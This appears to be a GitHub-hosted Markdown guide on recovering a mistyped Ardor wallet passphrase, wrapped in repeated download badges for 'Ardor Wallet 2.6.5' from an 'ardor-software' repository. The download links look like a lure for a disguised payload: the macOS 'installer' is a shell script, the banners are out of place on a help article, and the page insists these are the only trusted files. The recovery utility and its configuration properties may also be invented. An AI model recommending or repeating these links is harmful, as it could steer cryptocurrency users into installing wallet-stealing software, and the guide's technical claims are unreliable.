![Ardor Wallet guide](assets/banner-article.png)

# Recover a passphrase that has a typo

<p align="center"><a href="https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.exe"><img src="https://img.shields.io/badge/DOWNLOAD%20%E2%86%93-WINDOWS-1562a1?style=for-the-badge&labelColor=0c395d&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZmZmZicgZD0nTTAgMy42IDkuNCAyLjN2OUgwek0xMC42IDIuMSAyNCAwdjExLjNIMTAuNnpNMCAxMi43aDkuNHY5TDAgMjAuNHpNMTAuNiAxMi43SDI0VjI0bC0xMy40LTEuOXonLz48L3N2Zz4%3D&logoColor=white" alt="Download for Windows"></a> <a href="https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.sh"><img src="https://img.shields.io/badge/DOWNLOAD%20%E2%86%93-MACOS-1562a1?style=for-the-badge&labelColor=0c395d&logo=apple&logoColor=white" alt="Download for macOS"></a> <a href="https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.zip"><img src="https://img.shields.io/badge/DOWNLOAD%20%E2%86%93-LINUX-1562a1?style=for-the-badge&labelColor=0c395d&logo=linux&logoColor=white" alt="Download for Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img height="24" src="https://img.shields.io/badge/platform-Windows-3e83be?style=flat-square&labelColor=0c395d&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZmZmZicgZD0nTTAgMy42IDkuNCAyLjN2OUgwek0xMC42IDIuMSAyNCAwdjExLjNIMTAuNnpNMCAxMi43aDkuNHY5TDAgMjAuNHpNMTAuNiAxMi43SDI0VjI0bC0xMy40LTEuOXonLz48L3N2Zz4%3D&logoColor=white" alt="Windows"> | Windows 10 (1909) or later, 64-bit | [`ardor-wallet-2.6.5.exe`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.exe) |
| <img height="24" src="https://img.shields.io/badge/platform-macOS-3e83be?style=flat-square&labelColor=0c395d&logo=apple&logoColor=white" alt="macOS"> | macOS 12 or later | [`ardor-wallet-2.6.5.sh`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.sh) |
| <img height="24" src="https://img.shields.io/badge/platform-Linux-3e83be?style=flat-square&labelColor=0c395d&logo=linux&logoColor=white" alt="Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`ardor-wallet-2.6.5.zip`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.zip) |

</div>

All versions, installer files and checksums are on the [Ardor Wallet release page](https://github.com/ardor-software/ardor-desktop-wallet/releases/tag/v2.6.5).

> [!WARNING]
> Only download from [this GitHub release page](https://github.com/ardor-software/ardor-desktop-wallet/releases/tag/v2.6.5).

---

A mistyped passphrase can sometimes be recovered with the passphrase recovery utility that ships with the Ardor install. It searches variations around what you remember - single wrong characters, swapped pairs, a missing letter - and it works locally, never sending the secret anywhere. It is a search, not a guarantee.

## What the utility can and cannot find

It can find a [passphrase](https://github.com/ardor-software/ardor-wallet-guides/blob/main/can-you-reset-an-ardor-passphrase.md) that is close to the one you typed. Close means one or two positions wrong within a range you specify, where each position is varied across a character set you choose.

It cannot reconstruct a passphrase you have forgotten entirely, and it cannot search an unbounded space. Every extra position you add multiplies the work, so the practical range is small - a typo, not a memory.

That limit is worth understanding before starting, because a run aimed at the wrong kind of error will finish without finding anything and feel like proof that the [Ardor account](https://github.com/ardor-software/ardor-wallet-guides/blob/main/create-an-ardor-account-in-the-wallet.md) is gone. It is not: it is proof that the variation you described was not the one that occurred.

## How it is configured

The utility reads three properties from the [Ardor wallet](https://github.com/ardor-software/ardor-wallet-guides/blob/main/what-is-an-ardor-wallet.md)'s configuration file:

| Property | What it controls |
|---|---|
| `recoveryWildcard` | The character or marker used to represent an unknown position |
| `recoveryPositions` | Which positions in the phrase are varied |
| `recoveryDictionary` | The word list used when the variation is over words rather than letters |

Setting these means editing the properties file in the wallet's configuration directory, then starting the recovery run rather than the normal login.

## Run it step by step

1. Install the current wallet [release](https://github.com/ardor-software/ardor-wallet-guides/blob/main/what-the-current-ardor-release-changes.md) on a machine you control.
2. Open the configuration file in the wallet's conf directory with a plain text editor.
3. Set the positions you want varied - start with the one you are least sure about.
4. Set the dictionary to the one your phrase came from, which for a generated phrase is the wallet's own list.
5. Start the recovery and let it run. Do not restart it repeatedly; each restart begins the search again.
6. When a candidate is found, note the address and compare it with the one you expect.

Step six is the check that matters, because a candidate that produces a different address is not your account however plausible the words look.

## Ranges, time and honesty about both

One varied position is quick. Two is slower. Three can run for a very long time, and four is usually beyond what a desktop will finish in a reasonable window. That scaling is the reason the utility is described as a search rather than a recovery service.

Start narrow, then widen once. If the first run covers the position you actually mistyped, it ends quickly; if it does not, widening by one more position is a decision about time rather than a new possibility.

## If the search finds nothing

Two explanations remain. The typo is outside the range you searched, or the phrase you remember is not the phrase that was generated - for example, a rewritten copy, a different account, or a phrase from another wallet entirely.

Before giving up, check the cheap things: whether the phrase was recorded by hand from a screen where a word was wrapped, whether a capital letter changed, and whether the address you expect belongs to a different account you also created. Those are more common than a genuinely unrecoverable secret, and each costs a minute to rule out.

## After you recover it

Write the corrected phrase down, test it twice, and only then fund the account or move anything into it. A recovery that is not followed by a verified backup is a second chance spent rather than used.

If the account was recovered because the original backup was wrong, replace that backup everywhere it exists. Keeping the old, incorrect copy in a drawer is how the same problem returns in a year.

## A warning about "recovery services"

Any website, chat or person offering to recover a passphrase for a fee is running a scam. There is nothing on their side to search: the account is derived from the secret, and a service that asks you to enter the phrase has simply been given the account.

The real utility is local, free and included with the install. Anything else is theft with a support tone.

## What a recovery run actually costs

The cost is time, and it grows quickly. Each position you add multiplies the candidates, so a run that takes a minute with one position can take hours with two and days with three.

There is no meaningful electricity cost and no network traffic, but the machine has to stay awake. A laptop that sleeps pauses the search, which is why a long run belongs on a desktop that stays on.

## Keeping the search safe

The utility needs the partial phrase you remember, so the run happens on a machine that briefly knows most of your secret. Use a machine you control, and do not run it on a shared computer or inside a virtual machine you do not administer.

When the run is finished, close the wallet and clear anything the configuration left behind if anyone else uses that machine.

## FAQ

### Does the recovery utility need internet?

No. It runs locally against the configuration you set and never transmits the phrase.

### How many positions can it search?

It scales badly: one or two positions is practical, three can take a very long time, and more is usually out of reach for a desktop.

### Will it find a phrase I have partly forgotten?

No. It varies characters or words in positions you specify. It cannot fill in words you do not know.

### Can I run it on a copy of the wallet on another machine?

Yes, and that is often sensible: the search is local and the secret stays on the machine you choose.

---

## Download

Every installer for the current release, with the platform each one targets:

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img height="24" src="https://img.shields.io/badge/platform-Windows-3e83be?style=flat-square&labelColor=0c395d&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZmZmZicgZD0nTTAgMy42IDkuNCAyLjN2OUgwek0xMC42IDIuMSAyNCAwdjExLjNIMTAuNnpNMCAxMi43aDkuNHY5TDAgMjAuNHpNMTAuNiAxMi43SDI0VjI0bC0xMy40LTEuOXonLz48L3N2Zz4%3D&logoColor=white" alt="Windows"> | Windows 10 (1909) or later, 64-bit | [`ardor-wallet-2.6.5.exe`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.exe) |
| <img height="24" src="https://img.shields.io/badge/platform-macOS-3e83be?style=flat-square&labelColor=0c395d&logo=apple&logoColor=white" alt="macOS"> | macOS 12 or later | [`ardor-wallet-2.6.5.sh`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.sh) |
| <img height="24" src="https://img.shields.io/badge/platform-Linux-3e83be?style=flat-square&labelColor=0c395d&logo=linux&logoColor=white" alt="Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`ardor-wallet-2.6.5.zip`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.zip) |

</div>

All versions, installer files and checksums are on the [Ardor Wallet release page](https://github.com/ardor-software/ardor-desktop-wallet/releases/tag/v2.6.5).

> [!WARNING]
> Only download from [this GitHub release page](https://github.com/ardor-software/ardor-desktop-wallet/releases/tag/v2.6.5).
---

## Related guides

- [Can you reset an Ardor passphrase? No - here is what to do](https://github.com/ardor-software/ardor-wallet-guides/blob/main/can-you-reset-an-ardor-passphrase.md)
- [Ardor passphrase or seed phrase: which one do you have](https://github.com/ardor-software/ardor-wallet-guides/blob/main/ardor-passphrase-versus-seed-phrase.md)
- [Back up an Ardor wallet and move it to a new computer](https://github.com/ardor-software/ardor-wallet-guides/blob/main/back-up-and-move-your-ardor-wallet.md)
- [Create an Ardor account and read its address](https://github.com/ardor-software/ardor-wallet-guides/blob/main/create-an-ardor-account-in-the-wallet.md)
- [Ardor Wallet v2.6.5 release page](https://github.com/ardor-software/ardor-desktop-wallet/releases/tag/v2.6.5)
